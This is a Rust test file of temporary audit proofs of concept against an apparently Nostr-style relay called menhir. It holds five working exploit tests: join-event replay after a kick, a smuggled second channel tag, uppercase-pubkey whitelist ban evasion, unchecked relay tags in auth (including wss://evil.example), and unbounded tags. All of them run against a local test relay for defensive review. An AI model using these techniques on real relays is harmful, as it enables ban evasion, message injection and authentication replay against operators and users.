//! TEMPORARY audit PoCs — delete after review.

use std::path::PathBuf;
use std::time::Duration;

use menhir_core::client::Client;
use menhir_core::event::event_id;
use menhir_core::{kinds, Event, EventTemplate, Filter, Keys};
use menhir_relay::config::RelayConfig;
use menhir_relay::server;

const T: Duration = Duration::from_secs(5);

fn scratch_dir(label: &str) -> PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("menhir-poc-{label}-{}-{nanos}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

async fn start_relay(label: &str, operator: &Keys, open: bool) -> (server::RelayHandle, server::Shared, String) {
    let cfg = RelayConfig {
        port: 0,
        open,
        operator_pubkey: Some(operator.pk_hex.clone()),
        ..RelayConfig::default()
    };
    let (handle, st) = server::start(&scratch_dir(label), cfg).await.unwrap();
    let url = format!("ws://127.0.0.1:{}", handle.port);
    (handle, st, url)
}

fn create_channel(keys: &Keys, id: &str) -> Event {
    Event::sign(
        EventTemplate {
            kind: kinds::CREATE_GROUP,
            tags: vec![vec!["h".into(), id.into()]],
            content: String::new(),
            created_at: None,
        },
        keys,
    )
    .unwrap()
}

// ---------------------------------------------------------------------------
// PoC 1: side effects run BEFORE duplicate detection, and the Duplicate branch
// returns early -> membership DB changes without the 39001/39002 republish.
// ---------------------------------------------------------------------------
#[tokio::test]
async fn poc1_replayed_join_resurrects_member_but_metadata_goes_stale() {
    let operator = Keys::generate();
    let (_h, st, url) = start_relay("replay", &operator, false).await;

    let mut op = Client::connect(&url, None).await.unwrap();
    op.auth(&operator, T).await.unwrap();
    op.publish(&create_channel(&operator, "general"), T).await.unwrap();

    let victim = Keys::generate();
    st.db.whitelist_add(&victim.pk_hex, "poc").unwrap();
    let mut v = Client::connect(&url, None).await.unwrap();
    v.auth(&victim, T).await.unwrap();

    let join = Event::sign(
        EventTemplate {
            kind: kinds::JOIN_REQUEST,
            tags: vec![vec!["h".into(), "general".into()]],
            content: String::new(),
            created_at: None,
        },
        &victim,
    )
    .unwrap();
    let (ok, msg) = v.publish(&join, T).await.unwrap();
    assert!(ok, "join: {msg}");

    // Operator kicks the victim.
    let kick = Event::sign(
        EventTemplate {
            kind: kinds::REMOVE_USER,
            tags: vec![vec!["h".into(), "general".into()], vec!["p".into(), victim.pk_hex.clone()]],
            content: String::new(),
            created_at: None,
        },
        &operator,
    )
    .unwrap();
    let (ok, msg) = op.publish(&kick, T).await.unwrap();
    assert!(ok, "kick: {msg}");

    let members = st.db.members("general").unwrap();
    assert!(!members.iter().any(|(pk, _)| pk == &victim.pk_hex), "kick removed from db");

    // Victim REPLAYS the byte-identical join event.
    let (ok, msg) = v.publish(&join, T).await.unwrap();
    println!("PoC1 replay OK={ok} msg={msg:?}");
    assert!(ok);
    assert!(msg.contains("duplicate"), "expected duplicate branch, got {msg:?}");

    // DB now says the victim is a member again...
    let members = st.db.members("general").unwrap();
    let in_db = members.iter().any(|(pk, _)| pk == &victim.pk_hex);

    // ...but the relay-signed 39002 member list is stale.
    let published = op
        .req_collect(
            vec![Filter::new().kinds(vec![kinds::GROUP_MEMBERS]).tag("d", vec!["general".into()])],
            T,
        )
        .await
        .unwrap();
    let in_published = published
        .iter()
        .any(|e| e.tag_values("p").contains(&victim.pk_hex.as_str()));

    println!("PoC1 in_db={in_db} in_published_39002={in_published}");
    assert!(in_db, "victim silently re-added to members table by replay");
    assert!(!in_published, "39002 was NOT republished -> desync");
}

// ---------------------------------------------------------------------------
// PoC 2: authorization looks at first_tag("h") only, but every `h` tag is
// indexed -> a message can be injected into the history of any channel,
// including ones that do not exist / were never created.
// ---------------------------------------------------------------------------
#[tokio::test]
async fn poc2_second_h_tag_injects_into_other_channel_history() {
    let operator = Keys::generate();
    let (_h, st, url) = start_relay("htag", &operator, false).await;

    let mut op = Client::connect(&url, None).await.unwrap();
    op.auth(&operator, T).await.unwrap();
    op.publish(&create_channel(&operator, "sandbox"), T).await.unwrap();

    let attacker = Keys::generate();
    st.db.whitelist_add(&attacker.pk_hex, "poc").unwrap();
    let mut a = Client::connect(&url, None).await.unwrap();
    a.auth(&attacker, T).await.unwrap();

    // "announcements" was NEVER created; posting to it directly is refused.
    let direct = Event::sign(
        EventTemplate {
            kind: kinds::CHAT,
            tags: vec![vec!["h".into(), "announcements".into()]],
            content: "direct".into(),
            created_at: None,
        },
        &attacker,
    )
    .unwrap();
    let (ok, msg) = a.publish(&direct, T).await.unwrap();
    assert!(!ok, "direct post to unknown channel should be refused");
    println!("PoC2 direct refused: {msg}");

    // But a second h tag rides along.
    let smuggled = Event::sign(
        EventTemplate {
            kind: kinds::CHAT,
            tags: vec![
                vec!["h".into(), "sandbox".into()],
                vec!["h".into(), "announcements".into()],
            ],
            content: "SMUGGLED".into(),
            created_at: None,
        },
        &attacker,
    )
    .unwrap();
    let (ok, msg) = a.publish(&smuggled, T).await.unwrap();
    println!("PoC2 smuggled OK={ok} {msg:?}");
    assert!(ok);

    let hist = op
        .req_collect(
            vec![Filter::new().kinds(vec![kinds::CHAT]).tag("h", vec!["announcements".into()])],
            T,
        )
        .await
        .unwrap();
    println!("PoC2 #h=announcements returned {} events", hist.len());
    assert!(
        hist.iter().any(|e| e.content == "SMUGGLED"),
        "smuggled message appears in a channel that does not exist"
    );
}

// ---------------------------------------------------------------------------
// PoC 3: pubkey/id/sig hex is never canonicalised. Uppercase hex verifies fine
// and is stored verbatim, so whitelist/member rows key on a non-canonical
// string that operator tooling (pubkey_to_hex -> lowercase) can never remove.
// ---------------------------------------------------------------------------
#[tokio::test]
async fn poc3_uppercase_pubkey_hex_defeats_whitelist_removal() {
    let operator = Keys::generate();
    let (_h, st, url) = start_relay("case", &operator, false).await;

    let mut op = Client::connect(&url, None).await.unwrap();
    op.auth(&operator, T).await.unwrap();
    op.publish(&create_channel(&operator, "general"), T).await.unwrap();

    let attacker = Keys::generate();
    let upper = attacker.pk_hex.to_uppercase();
    assert_ne!(upper, attacker.pk_hex);

    let invite = st.db.invite_create(1, None).unwrap();

    // Hand-craft a kind 20284 with the UPPERCASE pubkey string.
    let created_at = menhir_core::now();
    let id = event_id(&upper, created_at, kinds::INVITE_REDEEM, &[], &invite.code);
    let sig = attacker.sign_digest(&hex::decode(&id).unwrap()).unwrap();
    let redeem = Event {
        id,
        pubkey: upper.clone(),
        created_at,
        kind: kinds::INVITE_REDEEM,
        tags: vec![],
        content: invite.code.clone(),
        sig,
    };
    assert!(redeem.verify().is_ok(), "uppercase hex still verifies");

    let mut a = Client::connect(&url, None).await.unwrap();
    let (ok, msg) = a.publish(&redeem, T).await.unwrap();
    println!("PoC3 redeem OK={ok} {msg:?}");
    assert!(ok, "relay accepted an uppercase-pubkey redemption");

    // The whitelist row is the uppercase string.
    println!("PoC3 whitelist = {:?}", st.db.whitelist_list().unwrap());
    assert!(st.db.whitelist_contains(&upper).unwrap());
    assert!(!st.db.whitelist_contains(&attacker.pk_hex).unwrap());

    // Operator tooling canonicalises to lowercase -> removal is a no-op.
    let removed = st.db.whitelist_remove(&attacker.pk_hex).unwrap();
    println!("PoC3 whitelist_remove(lowercase) -> {removed}");
    assert!(!removed, "operator ban silently does nothing");
    assert!(st.db.whitelist_contains(&upper).unwrap(), "attacker still whitelisted");

    // ...and the npub the operator sees in `whitelist list` is the normal one.
    let listed = st.db.whitelist_list().unwrap();
    let shown = menhir_core::keys::nip19_encode("npub", &listed[listed.len() - 1]);
    println!("PoC3 operator sees npub {shown}; attacker npub {}", attacker.npub());
    assert_eq!(shown, attacker.npub(), "displays identically to the real npub");

    // Attacker can still auth + write with the uppercase identity.
    let mut a2 = Client::connect(&url, None).await.unwrap();
    let deadline = tokio::time::Instant::now() + T;
    while a2.auth_challenge.is_none() {
        let rem = deadline.saturating_duration_since(tokio::time::Instant::now());
        let v = a2.recv(rem).await.unwrap();
        if v.get(0).and_then(|x| x.as_str()) != Some("AUTH") {
            a2.push_pending(v);
        }
    }
    let ch = a2.auth_challenge.clone().unwrap();
    let created_at = menhir_core::now();
    let tags = vec![vec!["challenge".to_string(), ch]];
    let id = event_id(&upper, created_at, kinds::CLIENT_AUTH, &tags, "");
    let sig = attacker.sign_digest(&hex::decode(&id).unwrap()).unwrap();
    let auth_ev = Event {
        id: id.clone(),
        pubkey: upper.clone(),
        created_at,
        kind: kinds::CLIENT_AUTH,
        tags,
        content: String::new(),
        sig,
    };
    a2.send_json(&serde_json::json!(["AUTH", auth_ev]));
    let mut authed = false;
    loop {
        let rem = deadline.saturating_duration_since(tokio::time::Instant::now());
        let Some(v) = a2.recv(rem).await else { break };
        if v.get(0).and_then(|x| x.as_str()) == Some("OK") && v.get(1).and_then(|x| x.as_str()) == Some(id.as_str())
        {
            authed = v.get(2).and_then(|x| x.as_bool()).unwrap_or(false);
            println!("PoC3 re-auth after ban: {v}");
            break;
        }
    }
    assert!(authed, "banned-by-lowercase attacker re-authenticates");
}

// ---------------------------------------------------------------------------
// PoC 4: NIP-42 `relay` tag is never checked -> a rogue relay can proxy its
// own challenge to a victim and replay the signed auth event to Menhir.
// ---------------------------------------------------------------------------
#[tokio::test]
async fn poc4_auth_event_without_relay_tag_is_accepted() {
    let operator = Keys::generate();
    let (_h, _st, url) = start_relay("relaytag", &operator, false).await;

    let mut c = Client::connect(&url, None).await.unwrap();
    let deadline = tokio::time::Instant::now() + T;
    while c.auth_challenge.is_none() {
        let rem = deadline.saturating_duration_since(tokio::time::Instant::now());
        let v = c.recv(rem).await.unwrap();
        if v.get(0).and_then(|x| x.as_str()) != Some("AUTH") {
            c.push_pending(v);
        }
    }
    let ch = c.auth_challenge.clone().unwrap();
    // No `relay` tag at all, and a *wrong* one, both accepted.
    for tags in [
        vec![vec!["challenge".to_string(), ch.clone()]],
        vec![
            vec!["relay".to_string(), "wss://evil.example".to_string()],
            vec!["challenge".to_string(), ch.clone()],
        ],
    ] {
        let ev = Event::sign(
            EventTemplate {
                kind: kinds::CLIENT_AUTH,
                tags: tags.clone(),
                content: String::new(),
                created_at: None,
            },
            &operator,
        )
        .unwrap();
        c.send_json(&serde_json::json!(["AUTH", ev.clone()]));
        loop {
            let rem = deadline.saturating_duration_since(tokio::time::Instant::now());
            let Some(v) = c.recv(rem).await else { panic!("no OK") };
            if v.get(0).and_then(|x| x.as_str()) == Some("OK")
                && v.get(1).and_then(|x| x.as_str()) == Some(ev.id.as_str())
            {
                println!("PoC4 tags={tags:?} -> {v}");
                assert!(v.get(2).and_then(|x| x.as_bool()).unwrap_or(false));
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// PoC 5: content cap is on `content` only; tags are unbounded and every
// single-char tag is written to the tag index.
// ---------------------------------------------------------------------------
#[tokio::test]
async fn poc5_tags_are_unbounded_despite_content_cap() {
    let operator = Keys::generate();
    let (_h, _st, url) = start_relay("tags", &operator, false).await;

    let mut op = Client::connect(&url, None).await.unwrap();
    op.auth(&operator, T).await.unwrap();
    op.publish(&create_channel(&operator, "general"), T).await.unwrap();

    let mut tags = vec![vec!["h".to_string(), "general".to_string()]];
    for i in 0..20_000 {
        tags.push(vec!["e".to_string(), format!("{i:064x}")]);
    }
    let ev = Event::sign(
        EventTemplate { kind: kinds::CHAT, tags, content: "x".into(), created_at: None },
        &operator,
    )
    .unwrap();
    let approx = serde_json::to_string(&ev).unwrap().len();
    let (ok, msg) = op.publish(&ev, T).await.unwrap();
    println!("PoC5 {approx} byte event (content cap 4096) accepted={ok} {msg:?}");
    assert!(ok, "20k tags accepted: {msg}");
}
